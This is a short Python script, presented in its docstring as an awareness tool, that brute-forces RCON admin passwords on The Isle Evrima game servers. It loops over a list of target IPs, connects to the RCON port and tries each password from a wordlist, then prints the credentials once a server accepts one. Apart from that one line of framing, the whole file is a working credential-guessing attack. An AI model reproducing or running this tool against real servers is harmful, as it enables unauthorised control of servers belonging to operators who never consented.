"""
RCON Brute Force tool for the Isle RCON.
This was made to increase awareness of how easy it is for someone to compromise your sever if using a default password.
Create a file called "ip_list.txt" with IP's to The Isle Evrima Servers
Create a file called "passwords.txt" with a list of common or default passwords.
You may change the RCON port as needed below
"""
import socket
port = int(9876)

__author__ = "ModernHam/Aspect"
__license__ = "GPLv3"

with open("ip_list.txt") as ip_list_file:
  for ip in ip_list_file:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      #Connect to the TCP Socket
      s.settimeout(5)
      try:
        s.connect((ip.split()[0], port))
        print("[i] Connected to RCON Server on " + ip.split()[0])
      except:
        print("[!] Could not connect to RCON on " + ip.split()[0])
        continue
      with open("passwords.txt") as password_list_file:
        for password in password_list_file:
          password = password.split()[0].encode()
          payload = bytes('\x01', 'utf-8') + password + bytes('\x00', 'utf-8')
          s.send((payload))
          message = s.recv(1024)
          if(str(message).__contains__("Accepted")):
            print("[!] PASSWORD FOUND FOR RCON SERVER AT : " + ip.split()[0] + ":" + str(port))
            print(password.decode())
            input("[!] Press Enter to continue to the next server IP")
            break
        print("[!] Password List Exhausted on Server " + ip.split()[0])
print("[!] Exhausted Server List")